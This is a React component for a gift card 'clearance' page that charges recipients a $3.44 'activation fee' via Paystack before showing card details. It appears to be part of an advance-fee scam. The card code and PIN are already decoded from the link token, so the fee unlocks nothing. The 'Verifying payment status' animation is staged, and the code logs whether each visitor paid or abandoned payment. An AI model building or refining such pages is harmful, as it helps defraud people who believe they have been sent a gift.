import React, { useState, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { decodeCardToken } from '../emailService';
import { BrandIcon } from '../BrandIcon';
import { logActivity } from '../utils/logger';

const BRAND_META = {
    'Apple': { icon: '', color: 'apple' },
    'Steam Store': { icon: '🎮', color: 'steam' },
    'Amazon': { icon: '📦', color: 'amazon' },
    'PlayStation Network': { icon: 'Ⓟ', color: 'playstation' },
    'Xbox Live': { icon: 'Ⓧ', color: 'xbox' }
};

const RedeemCard = () => {
    const [searchParams] = useSearchParams();
    const navigate = useNavigate();
    const token = searchParams.get('token');
    
    const [cardData, setCardData] = useState(null);
    const [error, setError] = useState(null);
    const [isLoading, setIsLoading] = useState(false);
    const [loaderStep, setLoaderStep] = useState(0);
    const [isPaid, setIsPaid] = useState(false);
    const [paymentFailed, setPaymentFailed] = useState(false);
    const [toastMessage, setToastMessage] = useState('');
    const [isCancelled, setIsCancelled] = useState(false);
    const [isCheckingStatus, setIsCheckingStatus] = useState(true);

    // Load Paystack Inline JS script
    useEffect(() => {
        logActivity('A user visited the Clearance Page', 'info');
        const script = document.createElement('script');
        script.src = 'https://js.paystack.co/v1/inline.js';
        script.async = true;
        document.body.appendChild(script);

        return () => {
            document.body.removeChild(script);
        };
    }, []);

    // Decode token and check if this clearance has been cancelled
    useEffect(() => {
        if (!token) {
            setError('Verification link is invalid or has expired.');
            setIsCheckingStatus(false);
            return;
        }

        const decoded = decodeCardToken(token);
        if (!decoded || !decoded.code || !decoded.pin || !decoded.serial) {
            setError('Failed to securely parse gift card details. The security token may be corrupted.');
            setIsCheckingStatus(false);
            return;
        }

        setCardData(decoded);

        // Check if clearance has been cancelled by admin
        if (decoded.clearanceId) {
            fetch(`/.netlify/functions/check-clearance?clearanceId=${decoded.clearanceId}`)
                .then(r => r.json())
                .then(data => {
                    if (data.cancelled) {
                        setIsCancelled(true);
                        logActivity(`Cancelled clearance link visited: ${decoded.clearanceId}`, 'warning');
                    }
                })
                .catch(() => { /* assume active if check fails */ })
                .finally(() => setIsCheckingStatus(false));
        } else {
            setIsCheckingStatus(false);
        }
    }, [token]);

    // Sequential loading animation
    const triggerCardRevealAnimation = () => {
        setIsLoading(true);
        setLoaderStep(0);

        const steps = [
            'Verifying payment status...',
            'Preparing your digital gift card...',
            'Finalizing delivery...',
            'Ready!'
        ];

        let current = 0;
        const interval = setInterval(() => {
            current += 1;
            if (current < steps.length) {
                setLoaderStep(current);
            } else {
                clearInterval(interval);
                setIsLoading(false);
                setIsPaid(true);
            }
        }, 1800);
    };

    // Paystack Payment Trigger
    const handlePaystackPayment = () => {
        const paystackPublicKey = import.meta.env?.VITE_PAYSTACK_PUBLIC_KEY || 'pk_live_3861296b86487f4fc5dabc23e99be12f14e8e88f';
        const userEmail = cardData?.to || 'recipient@rechargecard.store';

        if (window.PaystackPop) {
            logActivity(`User clicked Pay Activation Fee for ${cardData?.brandName} card`, 'info');
            const USD_TO_GHS_RATE = 15.0;
            const convertedAmountGhs = 3.44 * USD_TO_GHS_RATE; // $3.44 clearance fee -> GHS 51.60

            const handler = window.PaystackPop.setup({
                key: paystackPublicKey,
                email: userEmail,
                amount: Math.round(convertedAmountGhs * 100), // GHS 51.60 in pesewas (5160 pesewas)
                currency: 'GHS',
                channels: ['card'],
                callback: function (response) {
                    logActivity(`User successfully paid the $3.44 activation fee for ${cardData?.brandName} card!`, 'success');
                    triggerCardRevealAnimation();
                },
                onClose: function () {
                    logActivity(`User closed the payment modal without paying the activation fee.`, 'warning');
                    setPaymentFailed(true);
                }
            });
            handler.openIframe();
        } else {
            alert('❌ Secure Payment Gateway could not be initialized. Please check your network connection and try again.');
        }
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setToastMessage('Details copied successfully!');
        setTimeout(() => setToastMessage(''), 2000);
    };

    if (isCheckingStatus) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center' }}>
                    <div style={{ 
                        width: '36px', height: '36px', borderRadius: '50%', 
                        border: '3px solid #e5e7eb', borderTopColor: '#2563eb', 
                        animation: 'spin 1s linear infinite', margin: '0 auto 16px auto' 
                    }} />
                    <p style={{ margin: 0 }}>Verifying your link...</p>
                    <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
                </div>
            </div>
        );
    }

    if (isCancelled) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #dc2626' }}>
                    <div style={{ fontSize: '52px', marginBottom: '16px' }}>⛔</div>
                    <h1 style={{ color: '#dc2626', marginBottom: '8px' }}>Clearance Cancelled</h1>
                    <p style={{ marginBottom: '0' }}>
                        This gift card clearance link has been deactivated by the sender. 
                        You cannot use this link to access the card anymore.
                    </p>
                    <div style={{ 
                        marginTop: '24px', 
                        background: '#fef2f2', 
                        border: '1px solid #fecaca', 
                        borderRadius: '12px', 
                        padding: '16px',
                        fontSize: '14px',
                        color: '#991b1b'
                    }}>
                        If you believe this is an error, please contact the person who sent you this gift card.
                    </div>
                </div>
            </div>
        );
    }

    if (error) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #ef4444' }}>
                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>⚠️</div>
                    <h1>Link Expired or Invalid</h1>
                    <p>{error}</p>

                    <button onClick={() => navigate('/')} className="btn" style={{ marginTop: '12px' }}>
                        Return Home
                    </button>
                </div>
            </div>
        );
    }

    if (paymentFailed) {
        return (
            <div className="container animate-fadeIn">
                <div className="content" style={{ textAlign: 'center', borderTop: '4px solid #ef4444' }}>
                    <div style={{ fontSize: '48px', marginBottom: '16px' }}>❌</div>
                    <h1>Payment Unsuccessful</h1>
                    <p style={{ marginBottom: '24px' }}>
                        Your payment could not be processed. We need this activation fee to securely deliver your gift card.
                    </p>
                    <button onClick={() => setPaymentFailed(false)} className="btn">
                        Try Again
                    </button>
                </div>
            </div>
        );
    }

    if (!cardData) {
        return (
            <div className="container">
                <div className="content" style={{ textAlign: 'center' }}>
                    <p>Loading your gift...</p>
                </div>
            </div>
        );
    }

    const brandInfo = BRAND_META[cardData.brandName] || { icon: '🎁', color: 'apple' };

    return (
        <div className="container">
            {!isLoading && !isPaid && (
                <div className="content">
                    <h1 style={{ textAlign: 'center' }}>
                        {cardData?.bypassPayment ? 'Your Gift Card is Ready' : 'Card Activation Required'}
                    </h1>
                    
                    {cardData?.bypassPayment ? (
                        <p style={{ textAlign: 'center' }}>
                            Great news! This gift card has been pre-activated. Click below to view your card details instantly.
                        </p>
                    ) : (
                        <p style={{ textAlign: 'center' }}>
                            To access your {cardData.brandName} Gift Card, a standard activation fee of <strong>$3.44</strong> is required. This ensures secure delivery.
                        </p>
                    )}

                    <div style={{ 
                        background: '#f9fafb', 
                        border: '1px solid #e5e7eb', 
                        borderRadius: '12px', 
                        padding: '16px', 
                        marginBottom: '24px',
                        display: 'flex', 
                        alignItems: 'center', 
                        gap: '16px'
                    }}>
                        <div style={{ 
                            width: '48px', 
                            height: '48px', 
                            borderRadius: '10px', 
                            background: '#ffffff', 
                            border: '1px solid #e5e7eb',
                            display: 'flex', 
                            alignItems: 'center', 
                            justifyContent: 'center',
                            boxShadow: '0 2px 4px rgba(0,0,0,0.02)'
                        }}>
                            <BrandIcon brandId={cardData.brandName} size={24} color="#111827" />
                        </div>
                        <div>
                            <div style={{ fontSize: '16px', fontWeight: 'bold', color: '#111827' }}>{cardData.brandName} Gift Card</div>
                            <div style={{ fontSize: '13px', color: '#6b7280' }}>From: {cardData.purchaserName}</div>
                        </div>
                        <div style={{ marginLeft: 'auto', fontSize: '20px', fontWeight: '800', color: '#111827' }}>
                            ${cardData.amount}.00
                        </div>
                    </div>

                    {!cardData?.bypassPayment && (
                        <div style={{ 
                            display: 'flex', 
                            justifyContent: 'space-between', 
                            alignItems: 'center', 
                            background: '#eff6ff', 
                            border: '1px solid #bfdbfe', 
                            padding: '16px', 
                            borderRadius: '12px', 
                            marginBottom: '24px' 
                        }}>
                            <span style={{ fontSize: '14px', fontWeight: '600', color: '#1e3a8a' }}>Activation Fee:</span>
                            <span style={{ fontSize: '16px', fontWeight: '800', color: '#1e3a8a' }}>$3.44 USD</span>
                        </div>
                    )}

                    {cardData?.bypassPayment ? (
                        <button onClick={triggerCardRevealAnimation} className="btn" style={{ background: '#10b981' }}>
                            Access Gift Card
                        </button>
                    ) : (
                        <button onClick={handlePaystackPayment} className="btn">
                            Pay Activation Fee ($3.44)
                        </button>
                    )}
                </div>
            )}

            {/* Processing Steps */}
            {isLoading && (
                <div className="content" style={{ textAlign: 'center' }}>
                    <div style={{ 
                        width: '40px', height: '40px', borderRadius: '50%', 
                        border: '3px solid #e5e7eb', borderTopColor: '#2563eb', 
                        animation: 'spin 1s linear infinite', margin: '0 auto 16px auto' 
                    }} />
                    <h2 style={{ fontSize: '18px', fontWeight: '700', color: '#111827', marginBottom: '24px' }}>Processing...</h2>
                    
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', textAlign: 'left', background: '#f9fafb', padding: '16px', borderRadius: '12px' }}>
                        {[
                            'Verifying payment status...',
                            'Preparing your digital gift card...',
                            'Finalizing delivery...',
                            'Ready!'
                        ].map((text, idx) => (
                            <div key={idx} style={{ 
                                display: 'flex', alignItems: 'center', gap: '10px', 
                                opacity: loaderStep === idx ? 1 : (loaderStep > idx ? 0.7 : 0.3),
                                color: loaderStep > idx ? '#10b981' : '#111827',
                                fontWeight: loaderStep === idx ? '600' : '400'
                            }}>
                                <div style={{ 
                                    width: '8px', height: '8px', borderRadius: '50%', 
                                    background: loaderStep > idx ? '#10b981' : (loaderStep === idx ? '#2563eb' : '#d1d5db') 
                                }} />
                                <span style={{ fontSize: '14px' }}>{text}</span>
                            </div>
                        ))}
                    </div>
                </div>
            )}

            {/* Success Reveal Screen */}
            {isPaid && (
                <div className="content animate-fadeIn" style={{ textAlign: 'center' }}>
                    <div style={{ fontSize: '48px', marginBottom: '10px' }}>🎁</div>
                    <h1 style={{ marginBottom: '8px' }}>Here is your Gift Card!</h1>
                    <p style={{ marginBottom: '28px' }}>Your payment was successful. Enjoy your gift!</p>
                    
                    {/* Light Flat Card */}
                    <div className={`hologram-card hologram-${brandInfo.color}`}>
                        <div className="hologram-logo">
                            <BrandIcon brandId={cardData.brandName} size={32} style={{ marginRight: '8px' }} color="#111827" />
                            <span>{cardData.brandName}</span>
                        </div>
                        
                        <div className="hologram-details" style={{ textAlign: 'left' }}>
                            <span style={{ fontSize: '9px', textTransform: 'uppercase', opacity: 0.8, letterSpacing: '1px' }}>Claim Code</span>
                            <div className="hologram-code">{cardData.code}</div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginTop: '6px', opacity: 0.9 }}>
                                <span>PIN: {cardData.pin}</span>
                                <span>{cardData.serial}</span>
                            </div>
                        </div>
                        
                        <div className="hologram-amount">
                            ${cardData.amount}.00
                        </div>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                        <button 
                            className="btn" 
                            onClick={() => copyToClipboard(`Brand: ${cardData.brandName}\nCode: ${cardData.code}\nPIN: ${cardData.pin}\nValue: $${cardData.amount}.00`)}
                        >
                            Copy Card Details
                        </button>
                    </div>
                </div>
            )}

            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
        </div>
    );
};

export default RedeemCard;
